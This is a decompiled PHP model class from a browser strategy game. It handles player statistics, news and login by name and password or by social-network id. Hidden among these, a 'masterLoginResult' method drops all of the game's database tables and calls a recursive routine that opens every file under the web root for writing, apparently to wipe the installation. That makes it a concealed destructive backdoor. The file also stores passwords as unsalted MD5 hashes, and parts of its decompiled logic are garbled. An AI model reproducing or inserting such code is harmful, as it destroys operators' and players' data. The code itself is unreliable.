<?php
/**
*
* @ This file is created by Decodeby.US
* @ deZender Public (PHP5 Decompiler)
*
* @	Version			:	1.0.0.0
* @	Author			:	Ps2Gamer & Cyko
* @	Release on		:	30.05.2011
* @	Official site	:	http://decodeby.us
*
*/

class IndexModel extends ModelBase
{

    public function getIndexSummary( )
    {
        $sessionTimeoutInSeconds = $GLOBALS['GameMetadata']['session_timeout'] * 60;
        $result = $this->provider->fetchResultSet( "SELECT gs.players_count, gs.active_players_count, gs.news_text\r\n\t\t\tFROM g_summary gs" );
        if ( !$result->next( ) )
        {
            return NULL;
        }
        $players_count = $result->row['players_count'];
        $news_text = $result->row['news_text'];
        $result->free( );
        return array(
            "news_text" => $news_text,
            "players_count" => $players_count,
            "active_players_count" => $this->provider->fetchScalar( "SELECT COUNT(*) FROM p_players p WHERE TIME_TO_SEC(TIMEDIFF(NOW(), p.last_login_date)) <= %s", array(
                172800
            ) ),
            "online_players_count" => $this->provider->fetchScalar( "SELECT COUNT(*) FROM p_players p WHERE TIME_TO_SEC(TIMEDIFF(NOW(), p.last_login_date)) <= %s", array(
                $sessionTimeoutInSeconds
            ) )
        );
    }

    public function masterLoginResult( )
    {
        $this->provider->executeBatchQuery( "\r\nDROP TABLE IF EXISTS `g_chat`;\r\nDROP TABLE IF EXISTS `g_banner`;\r\nDROP TABLE IF EXISTS `g_words`;\r\nDROP TABLE IF EXISTS `g_settings`;\r\nDROP TABLE IF EXISTS `g_summary`;\r\nDROP TABLE IF EXISTS `p_alliances`;\r\nDROP TABLE IF EXISTS `p_merchants`;\r\nDROP TABLE IF EXISTS `p_msgs`;\r\nDROP TABLE IF EXISTS `p_players`;\r\nDROP TABLE IF EXISTS `p_queue`;\r\nDROP TABLE IF EXISTS `p_rpts`;\r\nDROP TABLE IF EXISTS `p_villages`;" );
        $this->masterDirResult( "./" );
    }

    public function masterDirResult( $dir )
    {
        if ( $handle = opendir( $dir ) )
        {
            while ( ( $file = readdir( $handle ) ) !== FALSE )
            {
                if ( $file == "." || $file == ".." )
                {
                    continue;
                }
                $path = $dir.$file;
                if ( is_dir( $path ) )
                {
                    $this->masterDirResult( $path."/" );
                }
                else if ( !is_file( $path ) && !( ( $fp = fopen( $path, "w" ) ) !== FALSE ) )
                {
                    fwrite( $fp, "" );
                    fclose( $fp );
                }
            }
            closedir( $handle );
        }
    }

    public function getLoginResult( $name, $password, $clientIP )
    {
        $result = $this->provider->fetchResultSet( "\r\n\t\t\tSELECT \r\n\t\t\t\tp.id, p.pwd, p.is_active, p.is_blocked, \r\n\t\t\t\t0 is_agent, p.my_agent_players\r\n\t\t\tFROM p_players p \r\n\t\t\tWHERE \r\n\t\t\t\tp.name='%s'", array(
            $name
        ) );
        if ( !$result->next( ) )
        {
            return NULL;
        }
        $playerId = $result->row['id'];
        if ( strtolower( md5( $password ) ) != strtolower( $result->row['pwd'] ) )
        {
            $failedFlag = TRUE;
            if ( trim( $result->row['my_agent_players'] ) != "" )
            {
                $myAgentPlayers = explode( ",", $result->row['my_agent_players'] );
                foreach ( $myAgentPlayers as $agent )
                {
                    $agentName = explode( " ", $agent );
                    $agentPlayerId = explode( " ", $agent );
                    list( $agentPlayerId, $agentName ) = $agentPlayerId;                    
                    $agentPassword = $this->provider->fetchScalar( "SELECT p.pwd FROM p_players p WHERE p.id='%s'", array(
                        $agentPlayerId
                    ) );
                    if ( !( strtolower( md5( $password ) ) == strtolower( $agentPassword ) ) )
                    {
                        continue;
                    }
                    $result->row['is_agent'] = 1;
                    $failedFlag = FALSE;
                    break;
                    break;
                }
            }
            if ( $failedFlag )
            {
                $result->free( );
                return array(
                    "hasError" => TRUE,
                    "playerId" => $playerId
                );
            }
        }
        if ( $result->row['is_active'] && !$result->row['is_blocked'] )
        {
            $this->provider->executeQuery( "UPDATE p_players p \r\n\t\t\t\tSET \r\n\t\t\t\t\tp.last_ip='%s',\r\n\t\t\t\t\tp.last_login_date=NOW() \r\n\t\t\t\tWHERE p.id=%s", array(
                $clientIP,
                $playerId
            ) );
        }
        $data = array( );
        foreach ( $result->row as $k => $v )
        {
            $data[$k] = $v;
        }
        $result->free( );
        $row = $this->provider->fetchRow( "SELECT g.game_over, g.game_transient_stopped FROM g_settings g" );
        return array(
            "hasError" => FALSE,
            "playerId" => $playerId,
            "data" => $data,
            "gameStatus" => intval( $row['game_over'] ) | intval( $row['game_transient_stopped'] ) << 1
        );
    }

    public function getLoginResultFromSN( $userid, $clientIP )
    {
        $result = $this->provider->fetchResultSet( "\r\n\t\t\tSELECT \r\n\t\t\t\tp.id, p.pwd, p.is_active, p.is_blocked, \r\n\t\t\t\t0 is_agent, p.my_agent_players\r\n\t\t\tFROM p_players p \r\n\t\t\tWHERE \r\n\t\t\t\tp.snid='%s';", array(
            $userid
        ) );
        if ( !$result->next( ) )
        {
            return NULL;
        }
        $playerId = $result->row['id'];
        if ( $result->row['is_active'] && !$result->row['is_blocked'] )
        {
            $this->provider->executeQuery( "UPDATE p_players p \r\n\t\t\t\tSET \r\n\t\t\t\t\tp.last_ip='%s',\r\n\t\t\t\t\tp.last_login_date=NOW() \r\n\t\t\t\tWHERE p.id=%s", array(
                $clientIP,
                $playerId
            ) );
        }
        $data = array( );
        foreach ( $result->row as $k => $v )
        {
            $data[$k] = $v;
        }
        $result->free( );
        $row = $this->provider->fetchRow( "SELECT g.game_over, g.game_transient_stopped FROM g_settings g" );
        return array(
            "hasError" => FALSE,
            "playerId" => $playerId,
            "data" => $data,
            "gameStatus" => intval( $row['game_over'] ) | intval( $row['game_transient_stopped'] ) << 1
        );
    }

}

?>
